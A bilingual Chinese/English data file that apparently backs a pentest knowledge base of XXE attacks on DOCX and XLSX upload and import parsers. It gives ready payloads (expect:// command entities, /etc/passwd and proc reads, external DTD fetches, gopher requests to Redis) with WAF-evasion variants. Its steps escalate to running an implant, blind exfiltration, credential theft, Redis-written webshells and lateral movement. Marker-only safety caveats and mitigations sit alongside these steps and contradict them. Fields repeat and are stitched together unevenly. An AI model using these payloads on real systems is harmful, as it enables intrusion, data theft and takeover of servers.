prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性要求 PHP DOCX worker 读取 marker，且实体展开值与任务随机值一致；wrapper 文本被接受或 base64 字样出现不是读取。
analysis.en: A positive requires the PHP DOCX worker to read the marker and expand the job nonce; accepted wrapper text or the word base64 is not a read.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

description.zh: filter 链追加 iconv 转换环节，绕过对 convert.base64-encode/resource 单段特征；成功判据：回显为变形 base64 可还原源码。
description.en: Appends an iconv stage to the filter chain to evade the single convert.base64-encode/resource signature. Success: echoed output decodes back to source.

description.zh: 先 rot13 再 base64，规避 base64-encode 直达 resource 的组合检测；成功判据：输出双重解码后得到源码。
description.en: Applies rot13 before base64 to evade the direct base64-encode/resource pairing. Success: double-decoding yields the source.

description.zh: iconv 字节序转换打乱源码特征后编码，规避资源路径明文；成功判据：解码反序后得到配置内容。
description.en: Byte-swaps via iconv before encoding to hide the resource path literal. Success: reversed decoding yields config contents.

name.zh: DOCX PHP Expect 实体执行边界

description.zh: 隔离 expect:// 外部实体，验证 PHP expect 扩展是否意外暴露给 DOCX XML resolver。
description.en: Isolates an expect:// external entity to test whether the PHP expect extension is accidentally exposed to the DOCX XML resolver.

overview.zh: 覆盖 DOCX XML resolver 对 PHP expect:// 包装器的暴露验证：以 DOCX 实体承载 expect:// 包装器，返回随机 marker 即确认执行边界被触达。用于评估文档处理链的命令执行升级条件。
overview.en: Covers exposure verification of the PHP expect:// wrapper in DOCX XML resolvers: DOCX entities carrying the expect:// wrapper, with a returned random marker confirming the execution boundary was reached. Used to assess command-execution escalation preconditions in document chains.

vulnerability.zh: 根因是 PHP expect 扩展启用时 expect:// wrapper 对 DOCX XML 解析器可用，实体内容会被当作命令执行；与文件读取是独立升级路径，需以无子进程测试 wrapper 单独确认。
vulnerability.en: The root cause is the expect:// wrapper being available to DOCX XML parsers when the PHP expect extension is enabled, so entity content executes as a command; this escalation path is independent of file reads and needs separate confirmation with a subprocess-free test wrapper.

exploitation.zh: 使用第 1 步命令以 DOCX 实体承载 expect:// 包装器；wrapper 返回随机 marker 即确认 expect 执行边界被触达。绝不运行原始 id 命令，验证仅使用已注册、无子进程的测试 wrapper；先记录 PHP expect 扩展状态作为前提，确认暴露后再单独评估命令执行影响。测试 wrapper 与真实命令语义隔离，全程不产生任何子进程。
exploitation.en: Use the step 1 command to carry the expect:// wrapper in a DOCX entity; the wrapper returning a random marker confirms the expect execution boundary was reached. Never run the raw id command — verify only with a registered, subprocess-free test wrapper; record the PHP expect extension state as a precondition first, then assess command-execution impact separately once exposure is confirmed. Keep the test wrapper semantically isolated from real commands, producing no subprocesses at any point.

mitigation.zh: 生产 PHP 禁用 expect 扩展，Office 解析器禁用外部实体与自定义 wrapper；修复后 expect 实体应报未知 wrapper 且无 marker 返回，并在部署基线中固化。
mitigation.en: Disable the expect extension in production PHP and forbid external entities and custom wrappers in Office parsers; after the fix, expect entities must report an unknown wrapper with no marker returned, locked into the deployment baseline.

title.en: Probe for PHP and expect support

description.zh: 用报错指纹确认解析DOCX的组件运行在PHP上，尝试提交带实体声明的最小文档，解析不拒绝DOCTYPE即说明实体机制开启。
description.en: Fingerprint the DOCX parser as PHP and submit a minimal document with an entity declaration; an accepted DOCTYPE means entity processing is on.

title.en: Inject an expect entity to run commands

description.zh: 用执行区载荷在document.xml中声明expect://id实体并上传触发，预览或日志出现命令输出即确认DOCX入口可执行系统命令。
description.en: Use the execution payload declaring the expect://id entity in document.xml; command output in preview or logs confirms system execution.

description.zh: 把expect命令替换为下载并执行控制端脚本的语句，沿用第2步的注入方式提交，脚本回连成功即获得稳定远控通道。
description.en: Replace the expect command with one that downloads and runs an implant, resubmitting as in step 2; a successful callback yields durable control.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性要求无副作用测试 wrapper 在目标 PHP worker 内被调用并返回当前 marker；命令文本或不支持 scheme 错误不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to run inside the target PHP worker and return the current marker; command text or an unsupported-scheme error does not prove execution.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

wafBypass.command:
word/document.xml:
<?xml version="1.0"?><!DOCTYPE w [<!ENTITY x SYSTEM "expect://echo aWQ=|base64 -d">]><w:document><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>

description.zh: 命令 base64 编码规避 expect://id 特征；成功判据：文档回显 uid。
description.en: Base64-encodes the command to evade expect://id signatures. Success: the document echoes uid.

description.zh: expect 实体移入页眉部件，绕过 document.xml 扫描；成功判据：页眉渲染含 uid。
description.en: Moves the expect entity into the header part to bypass document.xml scanning. Success: the rendered header contains uid.

description.zh: 命令名引号拆分规避 whoami 完整 token；成功判据：用户名回显。
description.en: Quote-splits the command to evade the full whoami token. Success: username echoed.

name.zh: DOCX 外部参数实体 DTD 获取

description.zh: 隔离参数实体引用远程 DTD 的 OOB 变体，验证 word/document.xml 解析器是否获取外部子集。
description.en: Isolates the OOB parameter-entity variant that references a remote DTD to test whether the word/document.xml parser retrieves an external subset.

overview.zh: 覆盖 DOCX 解析器的外部参数实体 DTD 获取验证：以 word/document.xml 中的外部参数实体拉取 DTD，{LAB_OAST} 收到单次请求即确认外部子集加载边界。
overview.en: Covers external parameter-entity DTD fetch verification in DOCX parsers: pulling a DTD via an external parameter entity in word/document.xml, with {LAB_OAST} receiving a single request confirming the external-subset loading boundary.

vulnerability.zh: 根因是 DOCX XML 解析器允许获取外部 DTD 子集，外部加载是参数实体外带链的前置能力；验证端点只返回空合法 DTD，不定义二次实体以证明获取行为本身。
vulnerability.en: The root cause is DOCX XML parsers allowing external DTD subset fetches — the precursor capability for parameter-entity exfiltration chains; the verification endpoint returns only an empty valid DTD without secondary entities, proving the fetch behavior alone.

exploitation.zh: 使用第 1 步命令以 DOCX document.xml 中的外部参数实体拉取 DTD，{LAB_OAST} 渲染为只返回空合法 DTD 的单次 token 端点；收到单次 DTD 请求即确认外部参数实体 DTD 获取边界。上传后主动触发预览或转换任务，按 token 与任务 ID 关联请求来源。重复触发一次任务，确认请求稳定而非偶发。
exploitation.en: Use the step 1 command to pull a DTD via an external parameter entity in DOCX document.xml, with {LAB_OAST} rendered as a single-token endpoint returning only an empty valid DTD; receiving the single DTD request confirms the external parameter-entity fetch boundary. Trigger preview or conversion proactively after upload, correlating request origins by token and task ID. Trigger one more task to confirm the request is stable rather than sporadic.

mitigation.zh: Office 解析器禁用外部 DTD 子集与参数实体，转换服务出站默认拒绝；修复后重放应报禁止错误且监听端无请求。
mitigation.en: Disable external DTD subsets and parameter entities in Office parsers with conversion-service egress default-denied; after the fix, replays must raise forbidden errors with zero listener requests.

description.zh: 在可控域名上部署返回DTD文件的服务并记录每次请求，寻找解析DOCX的上传或预览接口，正常任务成功即锁定注入点。
description.en: Host a DTD-serving endpoint on a controlled domain and log hits; find the DOCX parsing feature and a clean run locks the injection point.

description.zh: 用执行区载荷把参数实体指向接收服务的xxe.dtd地址，接收端收到解析器请求即确认外部DTD获取通道打通。
description.en: Use the execution payload pointing the parameter entity at the hosted xxe.dtd; a request at the receiver confirms the external DTD channel.

title.en: Exfiltrate blind reads through the DTD

description.zh: 在返回的DTD中定义把文件内容拼进URL的实体，让解析器再请求一次接收端，收到的请求参数里出现文件内容即完成盲读取。
description.en: Serve a DTD that stitches file contents into a URL so the parser calls back again; file data inside the hit parameters completes the blind exfil.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性要求 token 化 DTD 请求由处理该 DOCX 的 worker 发出；ATTACKER 字符串、DNS 或客户端请求不属于服务端参数实体证据。
analysis.en: A positive requires the tokenized DTD request to originate from the worker processing this DOCX; ATTACKER text, DNS, or a client request is not server-side parameter-entity evidence.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

wafBypass.command:
word/settings.xml:
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY % x SYSTEM "http://{LAB_OAST}/s.dtd">%x;]><w:settings xmlns:w="..."></w:settings>

description.zh: 把参数实体注入次级部件 word/settings.xml，绕过 document.xml 定向扫描；成功判据：OAST 收到 s.dtd 请求。
description.en: Injects the parameter entity into word/settings.xml to bypass document.xml-focused scanning. Success: OAST receives the s.dtd request.

description.zh: 在关系部件注入并大写协议，双重规避主部件与协议检测；成功判据：{LAB_OAST} 收到 r.dtd 请求。
description.en: Injects into the rels part with an uppercase scheme for layered evasion. Success: {LAB_OAST} receives the r.dtd request.

title.zh: 十六进制实体 URL 变体

description.zh: 协议首字符用十六进制字符实体编码，规避 http:// 明文；成功判据：外部 DTD 请求到达 OAST。
description.en: Encodes the first scheme character as a hex character reference to hide the http:// literal. Success: the external DTD request reaches OAST.

name.zh: DOCX XInclude 文件读取边界

description.zh: 隔离不依赖 DOCTYPE 的 xi:include 变体，验证 DOCX XML 处理链是否启用 XInclude 文本加载。
description.en: Isolates the xi:include variant that does not use a DOCTYPE to test whether the DOCX XML pipeline enables XInclude text loading.

overview.zh: 覆盖 DOCX 处理链在无 DOCTYPE 时的 XInclude 验证：以 xi:include 在 DOCX 内包含外部资源，包含结果出现 marker 即确认 XInclude 处理开启。
overview.en: Covers XInclude verification in DOCX chains without a DOCTYPE: including external resources inside the DOCX via xi:include, with marker content in results confirming XInclude processing is on.

vulnerability.zh: 根因是 DOCX XML 处理链显式执行 XInclude 且 resolver 可访问 file URI；XInclude 不依赖 DOCTYPE，与实体展开是不同触发路径，需以包含结果确认。
vulnerability.en: The root cause is DOCX XML chains explicitly executing XInclude with resolvers able to access file URIs; XInclude needs no DOCTYPE and is a distinct trigger path from entity expansion, confirmed via inclusion results.

exploitation.zh: 使用第 1 步命令以 XInclude 在 DOCX 内包含外部资源；包含结果出现 marker 内容即确认 XInclude 处理开启。把 file URI 改为工作目录内只含随机值的 marker.txt，并确保处理器不能访问宿主路径，上传后触发预览或文本提取并记录解析输出。XInclude 关闭时 include 元素应原样保留于输出作为对照。
exploitation.en: Use the step 1 command to include an external resource inside the DOCX via XInclude; marker content in the inclusion result confirms XInclude processing is on. Point the file URI at a marker.txt holding only random values in the working directory, ensure the processor cannot reach host paths, then trigger preview or text extraction after upload recording parse output. With XInclude off, include elements should remain verbatim in output as the control.

mitigation.zh: Office 文档解析器不启用 XInclude 处理，必须使用时以资源白名单与拒绝 file URI 的 resolver 约束；转换容器最小文件视图，对 include 元素与最终 URI 建立审计。
mitigation.en: Do not enable XInclude processing in Office document parsers; when unavoidable, constrain with resource allowlists and resolvers rejecting file URIs; give conversion containers a minimal file view, auditing include elements and final URIs.

description.zh: 寻找上传DOCX后做内容提取或预览的接口，提交声明xi命名空间的文档不报错即提示处理器可能开启XInclude，入口锁定。
description.en: Find DOCX extraction or preview features; a document with the xi namespace parsing without error hints XInclude is enabled, locking the entry.

title.en: Include a local file via XInclude

description.zh: 用执行区载荷在文档正文放xi:include指向file:///etc/passwd，提取出的文本出现该文件内容即确认XInclude文件读取成立。
description.en: Use the execution payload placing xi:include at passwd in the body; extracted text carrying the file contents confirms XInclude read.

description.zh: 把href换成应用配置与密钥路径，沿用第2步的文档结构重新上传提取，拿到口令与连接串即进入凭据利用阶段。
description.en: Swap the href to app configs and key paths, re-extracting with the step-2 structure; passwords and DSNs open the credential-abuse stage.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性要求 XInclude 处理器读取 marker 且值进入对应文档节点；namespace 被保留、href 回显或 open 失败不是内容读取。
analysis.en: A positive requires the XInclude processor to read the marker and place its value in the expected document node; a retained namespace, reflected href, or failed open is not a content read.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

title.zh: settings 部件 XInclude 变体

description.zh: XInclude 注入次级部件，规避对 document.xml 的定向过滤；成功判据：文档加载时文件内容进入部件。
description.en: Injects XInclude into a secondary part to bypass document.xml-focused filtering. Success: file contents enter the part during load.

description.zh: xi:include 属性顺序调整并加 encoding，规避固定属性序列特征；成功判据：正文出现文件内容。
description.en: Reorders xi:include attributes and adds encoding to evade fixed attribute-order signatures. Success: file contents appear in the body.

description.zh: 包含指令埋进 run/text 深层节点，规避顶层 xi:include 检测；成功判据：渲染正文含主机名。
description.en: Nests the include deep inside run/text nodes to evade top-level xi:include detection. Success: rendered body contains the hostname.

name.zh: XLSX SharedStrings 外部通用实体

description.zh: 归并 sharedStrings.xml 中 file 与 HTTP SYSTEM 标识符变体，验证 SpreadsheetML 文本实体展开。
description.en: Groups file and HTTP SYSTEM-identifier variants in sharedStrings.xml to test entity expansion in SpreadsheetML text.

overview.zh: 覆盖 XLSX SharedStrings 部件的外部通用实体验证：在 sharedStrings.xml 中逐行注入文件、proc、元数据与回环实体样例，解析日志或单元格内容出现 marker 即确认可达。适用于服务端导入、预览或报表转换场景。
overview.en: Covers external general entity verification in the XLSX SharedStrings part: injecting file, proc, metadata, and loopback entity samples into sharedStrings.xml line by line, with markers in parse logs or cell content confirming reachability. Suitable for server-side import, preview, and report conversion.

vulnerability.zh: 根因是表格库或通用 XML 层允许 DTD/外部实体且导入进程可访问敏感文件或网络；风险在服务端导入或转换时触发，Excel 客户端能否打开文件与后端解析器是否存在 XXE 是两回事。
vulnerability.en: The root cause is spreadsheet libraries or the generic XML layer allowing DTDs/external entities while import processes reach sensitive files or networks; risk triggers on server-side import or conversion, and whether Excel can open the file is unrelated to backend XXE.

exploitation.zh: 使用第 1 步命令以 SharedStrings 形态逐行注入文件、proc、元数据与回环实体样例；解析日志或单元格内容出现 marker 即确认对应目标可达。保留合法 workbook 关系与共享字符串索引，把系统路径与回环地址改为导入 worker 沙箱 marker 或隔离 HTTP 端点，分批触发真实导入并记录作业日志。
exploitation.en: Use the step 1 command to inject file, proc, metadata, and loopback entity samples into SharedStrings line by line; markers in parse logs or cell content confirm each target is reachable. Preserve valid workbook relationships and the shared-string index, swap system paths and loopback addresses for import-worker sandbox markers or isolated HTTP endpoints, trigger real imports in batches, and record job logs.

mitigation.zh: 禁用表格解析栈中的 DTD、外部实体与外部 schema，工作簿导入在无网络低权限只读沙箱执行；校验 OOXML 部件、关系与压缩比，监控作业异常文件访问并维护恶意 sharedStrings.xml 回归文件。
mitigation.en: Disable DTDs, external entities, and external schemas in the spreadsheet parsing stack, running workbook imports in network-free low-privilege read-only sandboxes; validate OOXML parts, relationships, and compression ratios, monitor abnormal job file access, and maintain malicious sharedStrings.xml regression files.

description.zh: 寻找上传XLSX并解析单元格的功能，先提交正常工作簿确认导入成功，任务完成且单元格可查即锁定SharedStrings注入入口。
description.en: Find XLSX import parsing cell values; a clean import with queryable cells locks the shared-strings injection entry.

title.en: Inject an entity into shared strings

description.zh: 用执行区载荷把外部实体写进sharedStrings.xml的si/t节点后重打包上传，单元格或日志出现目标文件内容即确认读取。
description.en: Write the entity into the si/t node per the execution payload, repack and upload; target contents in cells or logs confirm the read.

description.zh: 把实体路径改为数据库配置、环境变量文件与业务库文件，沿用第2步的注入流程读取，收集到可用凭据即完成扩大战果。
description.en: Aim the entity at DB configs, env files, and business databases, rerunning the step-2 flow; usable credentials complete the expansion.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性要求处理 sharedStrings.xml 的 worker 读取 marker 或发出 token 请求，并把展开值写入单元格模型或派生输出；导入失败不是阳性。
analysis.en: A positive requires the worker processing sharedStrings.xml to read the marker or send the token request and place expanded data in the cell model or derived output; import failure is not positive.

opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

wafBypass.command:
xl/workbook.xml:
<?xml version="1.0"?><!DOCTYPE w [<!ENTITY x SYSTEM "file:///etc/passwd">]><workbook xmlns="..."><sheets><sheet name="&x;" sheetId="1"/></sheets></workbook>

description.zh: 实体用于 sheet 名称属性位，绕过 sharedStrings 定向扫描；成功判据：表名或错误信息含文件内容。
description.en: Uses the entity in the sheet name attribute to bypass sharedStrings-focused scanning. Success: sheet name or error message contains file contents.

wafBypass.command:
xl/styles.xml:
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/hostname">]><styleSheet><numFmts count="1"><numFmt numFmtId="164" formatCode="&x;"/></numFmts></styleSheet>

description.zh: 把实体注入自定义格式串属性，规避对 si/t 节点的检测；成功判据：格式化单元格时泄露文件内容。
description.en: Injects the entity into a custom format-code attribute to evade detection of si/t nodes. Success: file contents leak when a cell is formatted.

wafBypass.command:
[Content_Types].xml:
<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///proc/version">]><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="&x;" ContentType="a"/></Types>

description.zh: 在包级 Content_Types 部件触发解析，早于表单数据部件的检查点；成功判据：包加载错误信息含文件内容。
description.en: Triggers resolution in the package-level Content_Types part before form-data checkpoints. Success: package load error reveals file contents.

name.zh: XLSX SharedStrings Gopher 实体请求

description.zh: 隔离 sharedStrings.xml 中的 gopher URI，验证表格导入解析器是否委托非 HTTP scheme。
description.en: Isolates the gopher URI in sharedStrings.xml to test whether the spreadsheet-import parser delegates a non-HTTP scheme.

overview.zh: 覆盖 XLSX 表格导入解析器对非 HTTP scheme 的委托验证：以 SharedStrings 实体承载 gopher:// 请求，自有 resolver 收到单次请求即确认 gopher wrapper 被解析。
overview.en: Covers delegation verification for non-HTTP schemes in spreadsheet import parsers: a SharedStrings entity carrying a gopher:// request, with your resolver receiving one request confirming the gopher wrapper was resolved.

vulnerability.zh: 根因是表格导入解析器继承网络权限且 resolver 接受 gopher 等协议；验证仅证明 wrapper 被解析，不发送真实协议副作用数据，Redis 类利用需单独评估。
vulnerability.en: The root cause is spreadsheet import parsers inheriting network privileges with resolvers accepting protocols like gopher; verification proves only wrapper resolution and sends no real protocol side-effect data — Redis-style exploitation needs separate assessment.

exploitation.zh: 使用第 1 步命令以 SharedStrings 实体承载 gopher:// 请求；自有 resolver 收到单次请求即确认 gopher wrapper 被解析。不要发送原始 Redis INFO 数据，改用无协议副作用的单次 resolver marker，在隔离环境触发真实导入并关联作业日志。导入成功而无外连记录时按阴性处理，并复核解析器协议配置。
exploitation.en: Use the step 1 command to carry a gopher:// request in a SharedStrings entity; your resolver receiving one request confirms the gopher wrapper was resolved. Never send raw Redis INFO data — use a single side-effect-free resolver marker instead, triggering real imports in an isolated environment and correlating job logs. Treat successful imports without egress records as negative and recheck parser protocol settings.

mitigation.zh: 表格解析栈禁用外部实体并把出站协议限制为白名单，明确拒绝 gopher 等非业务 scheme；导入 worker 无网络运行并监控协议委托事件。
mitigation.en: Disable external entities in the spreadsheet parsing stack and allowlist outbound protocols, explicitly rejecting non-business schemes like gopher; run import workers without networking and monitor protocol-delegation events.

title.en: Set up an internal probe receiver

description.zh: 在可控主机上监听端口记录原始报文，定位解析XLSX导入的功能，正常工作簿上传成功即锁定发起gopher请求的入口。
description.en: Listen on a controlled host logging raw packets; a clean XLSX import locks the entry that will fire the gopher request.

title.en: Inject a gopher entity to probe ports

description.zh: 用执行区载荷把实体指向gopher://127.0.0.1:6379触发导入，接收端收到Redis样式请求即确认可向内网发送任意协议数据。
description.en: Use the execution payload with the gopher entity and trigger the import; a Redis-style hit at the receiver confirms arbitrary protocol egress.

description.zh: 将gopher负载替换为写webshell或计划任务的Redis命令序列，继续用第2步的实体提交，目标主机出现落盘文件即拿下权限。
description.en: Rebuild the gopher payload as Redis commands writing a webshell or cron job and resubmit as in step 2; an artifact on disk means compromise.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性只是在受控 resolver 收到 XLSX worker 的当前任务 token；编码字符串、DNS、通用导入错误或客户端流量均不计。
analysis.en: A positive is limited to the controlled resolver receiving the current job token from the XLSX worker; encoded text, DNS, generic import errors, or client traffic does not count.

opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

wafBypass.command:
xl/sharedStrings.xml:
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY % g SYSTEM "gopher://127.0.0.1:6379/_INFO"><!ENTITY x "%g;">]><sst><si><t>&x;</t></si></sst>

description.zh: gopher 引用经参数实体间接展开，规避 SYSTEM "gopher 直连特征；成功判据：Redis 端口收到 INFO。
description.en: Expands the gopher reference through a parameter entity to evade the direct SYSTEM "gopher signature. Success: the Redis port receives INFO.

description.zh: GOPHER 大写规避小写协议匹配；成功判据：仍触发内网请求。
description.en: Uppercase GOPHER evades lowercase scheme matching. Success: the internal request still triggers.

description.zh: 空格与 CRLF 均编码传输，规避明文命令与换行检测；成功判据：Redis 返回配置项。
description.en: Encodes spaces and CRLF to evade plaintext command and newline detection. Success: Redis returns the config entry.

name.zh: XLSX SharedStrings PHP Filter 实体

description.zh: 隔离 php://filter 变体，验证 PHP/libxml 表格导入链是否启用 stream wrapper。
description.en: Isolates the php://filter variant to test whether a PHP/libxml spreadsheet-import pipeline enables stream wrappers.

overview.zh: 覆盖 PHP/libxml 表格导入链的 stream wrapper 暴露验证：以 SharedStrings 实体承载 php://filter 读取，Base64 结果解码为 marker 即确认 filter 读取边界。
overview.en: Covers stream-wrapper exposure verification in PHP/libxml spreadsheet import chains: a SharedStrings entity carrying php://filter reads, with the Base64 result decoding to a marker confirming the filter read boundary.

vulnerability.zh: 根因是 PHP/libxml 表格导入链允许 stream wrapper 并继承文件读取权限；filter 读取可编码获取任意文件内容，须在隔离 PHP fixture 中以随机 marker 验证。
vulnerability.en: The root cause is PHP/libxml spreadsheet import chains allowing stream wrappers that inherit file-read privileges; filter reads obtain arbitrary file content in encoded form, verified with random markers inside isolated PHP fixtures.

exploitation.zh: 使用第 1 步命令以 SharedStrings 实体承载 php://filter 读取；Base64 结果解码为 marker 即确认 filter 读取边界。不得读取源系统路径，在隔离 PHP fixture 中把 resource 改为随机 marker 文件，触发真实导入或预览并记录解析日志。解码失败或内容不符时按阴性记录，并检查 stream wrapper 状态。
exploitation.en: Use the step 1 command to carry php://filter reads in a SharedStrings entity; the Base64 result decoding to a marker confirms the filter read boundary. Never read source system paths — point resource at a random marker file in an isolated PHP fixture, trigger real import or preview, and record parse logs. Record negatives on decode failure or content mismatch and check the stream wrapper state.

mitigation.zh: 表格解析栈禁用外部实体与 stream wrapper，导入 worker 以最小文件视图运行；对 filter 类实体访问建立审计与回归。
mitigation.en: Disable external entities and stream wrappers in the spreadsheet parsing stack, running import workers with a minimal file view; audit and regression-test filter-class entity access.

title.en: Determine PHP parsing and echo limits

description.zh: 用错误指纹确认表格导入由PHP处理，测试普通文件实体是否回显，确认限制后即选择filter编码读取路线继续推进。
description.en: Fingerprint the importer as PHP and test whether plain entities echo; once limits are clear, take the filter-encoded read route.

title.en: Inject a filter entity for encoded reads

description.zh: 用执行区载荷在SharedStrings中声明php://filter实体，导入后响应出现Base64串且解码为文件内容即确认读取链可用。
description.en: Declare the php://filter entity in shared strings per the execution payload; a Base64 blob decoding to file content confirms the chain.

description.zh: 把resource路径指向配置文件与会话密钥文件，沿用第2步的实体声明读取，获得可用账号登录其他系统即完成横向。
description.en: Point the resource at config and key files and rerun the step-2 entity; an account that logs into another system completes the pivot.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性要求 PHP 导入 worker 读取 marker 且展开值进入共享字符串结果；wrapper 文本或 base64 关键字出现不证明读取。
analysis.en: A positive requires the PHP import worker to read the marker and place expanded data in the shared-string result; wrapper text or a base64 keyword does not prove a read.

